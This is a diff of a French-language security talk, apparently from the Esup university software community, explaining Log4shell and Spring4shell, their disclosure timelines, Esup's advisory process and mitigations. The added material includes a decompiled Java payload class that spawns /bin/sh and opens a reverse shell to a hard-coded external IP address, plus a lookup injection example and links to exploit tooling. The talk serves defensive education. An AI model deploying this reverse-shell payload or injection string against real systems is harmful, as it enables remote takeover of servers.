@@ -4,7 +4,10 @@
    <meta http-equiv="Content-type" content="text/html;charset=UTF-8" >
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
-    html { font-family: Arial, sans-serif; font-size: 160%; margin: 1rem; }
+    html { font-family: Arial, sans-serif; margin: 1rem; }
+    @media screen and (min-width: 1024px) {
+        html { font-size: 160%; }
+    }
     small { font-size: 60%; }
     ul { margin-top: 0; }    
     h4 { margin-bottom: 1rem; }
@@ -14,7 +17,10 @@
     li pre code.hljs { padding-left: 0; padding-right: 0; }
     i { color: #005cc5; }
     li::marker { color: #e30f47; }
-    img { margin: 1rem; max-width: 90vw; }
+    img { max-height: 80vh; }
+    @media screen and (min-width: 1024px) {
+        img { margin: 1rem; max-width: 80vw; }
+    }
    </style>
   </head>
 <body>
@@ -28,18 +34,18 @@
 
 <h2>Log4shell</h2> <!-------------------------------------------------------->
 
-<p>Faille historique : « la vulnérabilité la plus importante et la plus critique de la dernière décennie »</p>
+<p>Faille historique : « la vulnérabilité la plus importante et la plus critique de la dernière décennie » (<a href='https://fr.wikipedia.org/wiki/Log4Shell'>ref</a>)</p>
 <p>Score CVSS : <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">10/10</a></p>
 
 
 <h3>Histoire</h3>
 
 <ul>
-    <li>24 novembre : Chen Zhaojun communique la faille à l'équipe log4j</li>
-    <li>8 décembre : Chen Zhaojun prévient l'équipe log4j que la vulnérabilité a fuité</li>
-    <li>9 décembre : <a href='https://logging.apache.org/log4j/2.x/security.html'>publication</a> un peu précipitée de la faille, car la page va encore beaucoup bouger</li>
+    <li>24 novembre : Chen Zhaojun communique la faille à l'équipe Log4j</li>
+    <li>8 décembre : Chen Zhaojun prévient l'équipe Log4j que la vulnérabilité a fuité</li>
+    <li>9 décembre : <a href='https://logging.apache.org/log4j/2.x/security.html'>publication</a> un peu précipitée de la faille par l'équipe Log4j, car la page va encore beaucoup bouger</li>
     <li>jusqu'au vendredi 10 décembre au soir, l'annonce affirme que les nouvelles versions de JDK protègent du RCE (cf <a href='https://web.archive.org/web/20211210213710/https://logging.apache.org/log4j/2.x/security.html'>ancienne page</a>)</li>
-    <li>jusqu'au samedi 11 décembre, la vulnérabilité de log4j 1.x n'était pas clair (<a href='https://github.com/apache/logging-log4j2/pull/608#issuecomment-990494126'>ref</a>)</li>
+    <li>jusqu'au samedi 11 décembre, la vulnérabilité de Log4j 1.x n'était pas clair (<a href='https://github.com/apache/logging-log4j2/pull/608#issuecomment-990494126'>ref</a>)</li>
 </ul>
 
 Du côté de la coordination technique Esup, nous avons pu 
@@ -52,20 +58,22 @@ Du côté de la coordination technique Esup, nous avons pu
 
 <h3>La faille : de l'importance de l'escaping</h3>
 
-<p>Vous connaissez l'<a href='https://owasp.org/www-community/attacks/SQL_Injection'>injection SQL</a> ? l'<a href='https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#framework-security'>injection HTML</a> ?</p>
+<p>Vous connaissez l'<a href='https://owasp.org/www-community/attacks/SQL_Injection'>injection SQL</a> ? l'<a href='https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#framework-security'>injection HTML</a> ?
+Avec Log4j2, c'est l'injection via les <a href='https://logging.apache.org/log4j/2.x/manual/lookups.html'>lookups</a>. 
+</p>
 
-Avec Log4j2, c'est l'injection via les <a href='https://logging.apache.org/log4j/2.x/manual/lookups.html'>lookups</a>. Exemple :
+Exemple :
 <pre><code class="language-java">log.error("{}", "${env:PATH}");
 </code></pre>
-    est interprété en Log4j &lt; 2.15.0 !
+    est interprété en Log4j &lt; 2.15.0 😢
 
-<p> =&gt; toute url loggant un param issu de GET/POST/headers est impactée.</p>
+<p> ⇒ toute url loggant un param issu de GET/POST/headers est impactée.</p>
 
 <p>Combiné avec le <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">lookup Jndi</a>, on obtient :</p>
 
-<img src='https://govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/assets/log4j_attack.png'>
+<img src='log4j_attack.jpeg'>
+(<a href='https://govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/'>source</a>)
 
-<p>NB : il manque la solution "firewall" : empêcher les requêtes TCP sortantes</p>
 
 
 <h3>Démo</h3>
@@ -97,15 +105,62 @@ objectClass: javaNamingReference
 javaFactory: Log4jRCE
 </code></pre>
 
+L'attribut <code>javaCodeBase</code> est une url renvoyant un .class dont voici la décompilation :
+
+<pre><code class="language-java">
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class Exploit
+{
+    public Exploit() throws Exception {
+        String s = "213.152.161.239";
+        char c = '\u159E';
+        String s1 = "/bin/sh";
+        Process process = (new ProcessBuilder(new String[] {
+            s1
+        })).redirectErrorStream(true).start();
+        Socket socket = new Socket(s, c);
+        InputStream inputstream = process.getInputStream();
+        InputStream inputstream1 = process.getErrorStream();
+        InputStream inputstream2 = socket.getInputStream();
+        OutputStream outputstream = process.getOutputStream();
+        OutputStream outputstream1 = socket.getOutputStream();
+        do
+        {
+            if(socket.isClosed())
+                break;
+            for(; inputstream.available() > 0; outputstream1.write(inputstream.read()));
+            for(; inputstream1.available() > 0; outputstream1.write(inputstream1.read()));
+            for(; inputstream2.available() > 0; outputstream.write(inputstream2.read()));
+            outputstream1.flush();
+            outputstream.flush();
+            Thread.sleep(50L);
+            try
+            {
+                process.exitValue();
+                break;
+            }
+            catch(Exception exception) { }
+        } while(true);
+        process.destroy();
+        socket.close();
+    }
+}    
+</code></pre>
+
+⇒ d'où le nom Log4shell 
+
 <p>Des outils existent pour démarrer un serveur LDAP qui renvoie ce qu'il faut au format attendu par Java : <a href='https://github.com/veracode-research/rogue-jndi'>exemple</a>...</p>
 
 
-<h3>A propos des libs de logs en Java</h3>
+<h3>A propos des librairies de logs en Java</h3>
 
 En java, 3 librairies (implémentations) de logs sont principalement utilisées : log4j, log4j2 et logback.
 
 <ul>
-    <li>log4j est la librairie historique : elle est encore très utilisée. log4j est un projet distinct de log4j2</li>
+    <li>log4j est la librairie historique : elle est encore très utilisée. Log4j est un projet distinct de log4j2</li>
     <li>log4j tend à être remplacée par log4j2 ou slf4j+logback</li>
 </ul>
 
@@ -115,20 +170,23 @@ En java, 3 librairies (implémentations) de logs sont principalement utilisées 
 
 <h2>Fonctionnement des annonces de sécurité Esup</h2> <!-------------------------------------------------------->
 
-exemple avec Spring4shell :
+Exemple avec Spring4shell :
 
 <ul>
     <li>31 mars 2022 : </li>
     <ul>
-        <li>réception de la faille</li>
-        <li>reproduction de l'exploit via des POC</li>
-        <li>reproduction de l'exploit sur esup-dematec</li>
+        <li>réception de la faille <small>(notamment via des msgs de Scott Cantor sur la liste users@shibboleth.net)</small></li>
+        <li>compréhension et reproduction de l'exploit via des <a href='https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/'>explications</a> et des <a href="https://github.com/reznok/Spring4Shell-POC">POC</a></li>
+        <li>reproduction de l'exploit sur esup-dematec <small>(<a href='https://github.com/EsupPortail/esup-dematec/blob/8e19fa74bb7aa6f71e504040a3b6b6c0725e9be5/src/main/java/fr/univrouen/poste/web/ForgotPasswordController.java#L100'>code déclanchant la faille</a>)</small></li>
     </ul>
     <li>1 avril 2022</li>
     <ul>
         <li>envoi d'un mail à esupdematec-devel@esup-portail.org</li>
         <li>rédaction de l'<a href="https://www.esup-portail.org/wiki/display/SECU/ESUP-2022-AVI-001+-+CVE-2022-22965">avis de sécurité</a></li>
         <li>envoi de l'avis à securite@esup-portail.org</li>
+    </ul>
+    <li>11 avril 2022</li>
+    <ul>
         <li>envoi de l'avis à esup-utilisateurs@esup-portail.org</li>
     </ul>
 </ul>
@@ -139,8 +197,11 @@ exemple avec Spring4shell :
 
 <ul>
     <li>gardez vos applications à jour <small>(ou pas /o\)</small></li>
-    <li>évitez que l'utilisateur exécutant Java ait les droits de modifier jsp/properties/class/...</li>
+    <li>évitez que l'utilisateur exécutant Java soit celui qui possède les fichiers jsp/properties/class/...
+        <br><small>« You need separate accounts. The container can't run as the owner of the files » (Scott Cantor sur la liste users@shibboleth.net)</small>
+    </li>
     <li>empêchez les requêtes sortantes du serveur <small>(faire un "REJECT" et pas un "DROP" sinon le RCE devient un DoS)</small></li>
+    <li>...?</li>
 </ul>
 
 
